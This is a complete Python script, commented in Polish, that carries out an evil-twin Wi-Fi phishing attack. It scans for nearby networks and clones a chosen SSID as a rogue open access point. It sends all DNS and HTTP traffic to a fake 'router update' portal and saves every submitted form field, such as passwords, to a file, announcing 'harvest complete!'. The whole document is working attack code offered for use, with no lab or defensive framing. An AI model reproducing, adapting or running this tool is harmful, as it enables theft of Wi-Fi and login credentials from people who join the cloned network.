#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import logging
from urllib.parse import parse_qs

# Konfiguracja logowania
logging.basicConfig(level=logging.INFO, format='%(message)s')

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_RUNNING = "\033[31m" if COLOR_ENABLED else ""
COLOR_STOP = "\033[33m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""


def color_text(text, color):
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text, *styles):
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text
# Konfiguracja
AP_CHANNEL = "6"
AP_IP = "192.168.100.1"
SUBNET = "192.168.100.0"
NETMASK = "255.255.255.0"
DHCP_RANGE_START = "192.168.100.100"
DHCP_RANGE_END = "192.168.100.200"
LEASE_TIME = "12h"

PORTAL_HTML = None
PORTAL_HTML_PATH = os.path.join(os.path.dirname(__file__), "Router_update_v2.html")
CAPTURE_FILE_PATH = None
SUBMISSION_EVENT = threading.Event()
SUBMISSION_LOCK = threading.Lock()
LAST_SUBMISSION_IP = None



def load_portal_html():
    if not os.path.isfile(PORTAL_HTML_PATH):
        raise FileNotFoundError(f"Portal HTML file not found: {PORTAL_HTML_PATH}")
    with open(PORTAL_HTML_PATH, "r", encoding="utf-8") as portal_file:
        return portal_file.read()


def get_interface_chipset(interface):
    try:
        result = subprocess.run(
            ["ethtool", "-i", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return "unknown"

    if result.returncode != 0:
        return "unknown"

    driver = None
    bus_info = None
    for line in result.stdout.splitlines():
        if line.startswith("driver:"):
            driver = line.split(":", 1)[1].strip()
        if line.startswith("bus-info:"):
            bus_info = line.split(":", 1)[1].strip()

    if driver and bus_info and bus_info != "":
        return f"{driver} ({bus_info})"
    if driver:
        return driver
    return "unknown"


def list_network_interfaces():
    interfaces = []
    ip_link = subprocess.run(['ip', '-o', 'link', 'show'], stdout=subprocess.PIPE, text=True, check=False)
    for line in ip_link.stdout.splitlines():
        if ": " in line:
            name = line.split(": ", 1)[1].split(":", 1)[0]
            if name and name != "lo":
                interfaces.append(name)
    return interfaces


def scan_wireless_networks(interface):
    try:
        result = subprocess.run(
            ["iw", "dev", interface, "scan"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        logging.error("Required tool 'iw' not found!")
        return []

    if result.returncode != 0:
        logging.error("Wireless scan failed: %s", result.stderr.strip() or "unknown error")
        return []

    networks = {}
    current_signal = None
    for raw_line in result.stdout.splitlines():
        line = raw_line.strip()
        if line.startswith("BSS "):
            current_signal = None
            continue
        if line.startswith("signal:"):
            parts = line.split()
            try:
                current_signal = float(parts[1])
            except (IndexError, ValueError):
                current_signal = None
            continue
        if line.startswith("SSID:"):
            ssid = line.split(":", 1)[1].strip()
            if not ssid:
                continue
            existing = networks.get(ssid)
            if existing is None or (
                current_signal is not None
                and (existing["signal"] is None or current_signal > existing["signal"])
            ):
                networks[ssid] = {"ssid": ssid, "signal": current_signal}

    return sorted(
        networks.values(),
        key=lambda item: item["signal"] if item["signal"] is not None else -1000,
        reverse=True,
    )


def select_network_ssid(interface):
    while True:
        networks = scan_wireless_networks(interface)
        if not networks:
            logging.warning("No networks found during scan.")
            retry = input(f"{style('Rescan', STYLE_BOLD)}? (Y/N): ").strip().lower()
            if retry == "y":
                continue
            sys.exit(1)

        logging.info(style("Available networks:", STYLE_BOLD))
        for index, network in enumerate(networks, start=1):
            signal = (
                f"{network['signal']:.1f} dBm"
                if network["signal"] is not None
                else "signal unknown"
            )
            label = f"{index}) {network['ssid']} -"
            logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), signal)

        choice = input(
            f"{style('Select network', STYLE_BOLD)} (number, or R to rescan): "
        ).strip().lower()
        if choice == "r":
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(networks):
                return networks[idx - 1]["ssid"]
        logging.warning("Invalid selection. Try again.")


def select_interface(interfaces):
    if not interfaces:
        logging.error("No network interfaces found.")
        sys.exit(1)

    logging.info(style("Available interfaces:", STYLE_BOLD))
    for index, name in enumerate(interfaces, start=1):
        chipset = get_interface_chipset(name)
        label = f"{index}) {name} -"
        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)

    while True:
        choice = input(f"{style('Select AP interface', STYLE_BOLD)} (number or name): ").strip()
        if not choice:
            logging.warning("Please select an interface.")
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(interfaces):
                return interfaces[idx - 1]
        if choice in interfaces:
            return choice
        logging.warning("Invalid selection. Try again.")


def sanitize_filename(name):
    sanitized = name.replace(os.sep, "_")
    if os.altsep:
        sanitized = sanitized.replace(os.altsep, "_")
    return sanitized

class CaptivePortalHandler(BaseHTTPRequestHandler):
    PORTAL_PATHS = {
        "/",
        "/index.html",
        "/captive.html",
        "/hotspot-detect.html",
        "/generate_204",
        "/gen_204",
        "/mobile/status.php",
        "/ncsi.txt",
        "/connecttest.txt",
        "/redirect",
        "/success.txt",
        "/library/test/success.html",
    }

    def _redirect_to_portal(self):
        self.send_response(302)
        self.send_header("Location", f"http://{AP_IP}/")
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
        self.send_header("Pragma", "no-cache")
        self.end_headers()

    def do_GET(self):
        """Handle GET requests - display login page"""
        logging.info("Portal connection from %s to %s", self.client_address[0], self.path)

        if self.path in self.PORTAL_PATHS:
            if self.path in {"/generate_204", "/gen_204", "/redirect", "/connecttest.txt", "/ncsi.txt"}:
                self._redirect_to_portal()
                return

        # Always display login page regardless of path (improves captive portal reach)
        html_content = PORTAL_HTML or load_portal_html()

        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Content-Length', len(html_content.encode('utf-8')))
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))

    def do_POST(self):
        """Store submitted form data."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        decoded = post_data.decode("utf-8", errors="replace")
        parsed = parse_qs(decoded)
        global LAST_SUBMISSION_IP
        with SUBMISSION_LOCK:
            LAST_SUBMISSION_IP = self.client_address[0]
        SUBMISSION_EVENT.set()

        if CAPTURE_FILE_PATH:
            timestamp = datetime.now().isoformat(sep=" ", timespec="seconds")
            with open(CAPTURE_FILE_PATH, "a", encoding="utf-8") as capture_file:
                capture_file.write(f"[{timestamp}] {self.client_address[0]}\n")
                if parsed:
                    for key, values in parsed.items():
                        for value in values:
                            capture_file.write(f"{key}={value}\n")
                else:
                    capture_file.write(decoded + "\n")
                capture_file.write("\n")
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Login received.")
    
    def log_message(self, format, *args):
        # Wyłącz domyślne logowanie HTTP
        pass


def setup_ap():
    """Konfiguracja i uruchomienie Access Point"""
    logging.info("Setting up Access Point...")
    
    try:
        # Zatrzymanie NetworkManager, jeśli jest aktywny
        subprocess.run(['systemctl', 'stop', 'NetworkManager'], stderr=subprocess.DEVNULL)
        subprocess.run(['systemctl', 'stop', 'wpa_supplicant'], stderr=subprocess.DEVNULL)
        time.sleep(2)
        
        # Włączenie interfejsu
        subprocess.run(['ip', 'link', 'set', AP_INTERFACE, 'down'])
        time.sleep(1)
        subprocess.run(['ip', 'link', 'set', AP_INTERFACE, 'up'])
        time.sleep(1)
        
        # Ustawienie adresu IP
        subprocess.run(['ip', 'addr', 'flush', 'dev', AP_INTERFACE])
        subprocess.run(['ip', 'addr', 'add', f'{AP_IP}/24', 'dev', AP_INTERFACE])
        
        # Konfiguracja hostapd
        hostapd_conf = f"""
interface={AP_INTERFACE}
driver=nl80211
ssid={AP_SSID}
hw_mode=g
channel={AP_CHANNEL}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        
        with open('/tmp/hostapd.conf', 'w') as f:
            f.write(hostapd_conf)
        
        # Uruchomienie hostapd w tle
        hostapd_process = subprocess.Popen(['hostapd', '/tmp/hostapd.conf'], 
                                         stdout=subprocess.PIPE, 
                                         stderr=subprocess.PIPE)
        time.sleep(3)
        
        # Konfiguracja dnsmasq jako DHCP i DNS
        dnsmasq_conf = f"""
interface={AP_INTERFACE}
dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},{NETMASK},{LEASE_TIME}
dhcp-option=3,{AP_IP}
dhcp-option=6,{AP_IP}
address=/#/{AP_IP}
server=8.8.8.8
log-queries
log-dhcp
"""
        
        with open('/tmp/dnsmasq.conf', 'w') as f:
            f.write(dnsmasq_conf)
        
        # Uruchomienie dnsmasq
        dnsmasq_process = subprocess.Popen(['dnsmasq', '-C', '/tmp/dnsmasq.conf', '--no-daemon'],
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE)
        time.sleep(2)
        
        # Włączenie forwardowania
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Konfiguracja iptables
        subprocess.run(['iptables', '-t', 'nat', '-F'])
        subprocess.run(['iptables', '-F'])
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', AP_INTERFACE, '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', f'{AP_IP}:80'])
        
        logging.info(f"Access Point '{AP_SSID}' started on {AP_IP}")
        logging.info(f"DHCP range: {DHCP_RANGE_START} - {DHCP_RANGE_END}")
        
        return hostapd_process, dnsmasq_process
        
    except Exception as e:
        logging.error(f"Error setting up AP: {e}")
        return None, None

def start_captive_portal():
    """Uruchomienie serwera HTTP dla captive portal"""
    logging.info(f"Starting Captive Portal HTTP server on {AP_IP}:80")
    
    server = HTTPServer((AP_IP, 80), CaptivePortalHandler)
    
    # Uruchom serwer w wątku
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    
    logging.info("Captive Portal HTTP server started")
    return server

def cleanup():
    """Czyszczenie konfiguracji przy wyjściu"""
    logging.info("Cleaning up...")
    
    # Przywróć iptables
    subprocess.run(['iptables', '-t', 'nat', '-F'], stderr=subprocess.DEVNULL)
    subprocess.run(['iptables', '-F'], stderr=subprocess.DEVNULL)
    
    # Zatrzymaj usługi
    subprocess.run(['pkill', 'hostapd'], stderr=subprocess.DEVNULL)
    subprocess.run(['pkill', 'dnsmasq'], stderr=subprocess.DEVNULL)
    
    # Przywróć interfejs
    subprocess.run(['ip', 'link', 'set', AP_INTERFACE, 'down'], stderr=subprocess.DEVNULL)
    
    # Uruchom ponownie NetworkManager
    subprocess.run(['systemctl', 'start', 'NetworkManager'], stderr=subprocess.DEVNULL)
    
    logging.info("Cleanup completed")

def run_portal_session():
    """Uruchomienie pojedynczej sesji portalu"""
    SUBMISSION_EVENT.clear()
    with SUBMISSION_LOCK:
        global LAST_SUBMISSION_IP
        LAST_SUBMISSION_IP = None
    
    # Wybór interfejsu AP
    interfaces = list_network_interfaces()
    globals()["AP_INTERFACE"] = select_interface(interfaces)

    subprocess.run(['ip', 'link', 'set', AP_INTERFACE, 'up'], stderr=subprocess.DEVNULL)
    input(f"{style('Press Enter', STYLE_BOLD)} to scan networks on {AP_INTERFACE}...")

    # Nazwa sieci po skanowaniu
    globals()["AP_SSID"] = select_network_ssid(AP_INTERFACE)

    input(
        f"{style('Press Enter', STYLE_BOLD)} to start captive portal "
        f"'{style(AP_SSID, COLOR_SUCCESS, STYLE_BOLD)}'..."
    )

    capture_filename = sanitize_filename(AP_SSID)
    globals()["CAPTURE_FILE_PATH"] = os.path.join(os.path.dirname(__file__), capture_filename)
    logging.info("Capturing portal submissions in: %s", CAPTURE_FILE_PATH)
    
    http_server = None
    restart_requested = False
    try:
        # Uruchom Access Point
        hostapd_proc, dnsmasq_proc = setup_ap()
        if not hostapd_proc or not dnsmasq_proc:
            logging.error("Failed to start Access Point")
            return False
        
        # Poczekaj chwilę na uruchomienie AP
        time.sleep(5)
        
        # Uruchom Captive Portal
        http_server = start_captive_portal()
        
        logging.info("=" * 50)
        logging.info(f"Captive Portal is {style('running', COLOR_RUNNING, STYLE_BOLD)}!")
        logging.info(f"SSID: {style(AP_SSID, COLOR_SUCCESS, STYLE_BOLD)}")
        logging.info("=" * 50)
        logging.info(
            "Press %s to %s",
            style("Ctrl+C", STYLE_BOLD),
            style("STOP the portal", COLOR_STOP, STYLE_BOLD),
        )
        
        # Zachowaj procesy w pamięci
        processes = [hostapd_proc, dnsmasq_proc]
        
        # Główna pętla
        while True:
            time.sleep(1)

            if SUBMISSION_EVENT.is_set():
                with SUBMISSION_LOCK:
                    SUBMISSION_EVENT.clear()

                logging.info(style("harvest complete!", COLOR_SUCCESS, STYLE_BOLD))
                while True:
                    exit_choice = input(
                        f"{style('Exit script', STYLE_BOLD)} (E) or {style('restart', STYLE_BOLD)} (R): "
                    ).strip().lower()
                    if exit_choice in {"e", "exit"}:
                        break
                    if exit_choice in {"r", "restart"}:
                        restart_requested = True
                        break
                    logging.warning("Please enter E or R.")

                break

            # Sprawdź czy procesy działają
            for i, proc in enumerate(processes):
                if proc and proc.poll() is not None:
                    logging.error(f"Process {i} died!")
                    return False
                    
    except KeyboardInterrupt:
        logging.info(color_text("Shutting down...", COLOR_STOP))
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
    finally:
        if http_server:
            http_server.shutdown()
            http_server.server_close()
        cleanup()

    return restart_requested


def main():
    """Główna funkcja"""
    logging.info(color_text("Portal Wizard", COLOR_HEADER))
    logging.info("Starting Captive Portal System")
    
    # Sprawdź uprawnienia
    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)
    
    # Sprawdź dostępność wymaganych narzędzi
    required_tools = ['hostapd', 'dnsmasq', 'iptables', 'ip', 'ethtool', 'iw']
    for tool in required_tools:
        if subprocess.run(['which', tool], stdout=subprocess.DEVNULL).returncode != 0:
            logging.error(f"Required tool '{tool}' not found!")
            sys.exit(1)

    while True:
        restart = run_portal_session()
        if not restart:
            break
        logging.info(color_text("Restarting portal wizard...\n", COLOR_HEADER))


if __name__ == "__main__":
    main()
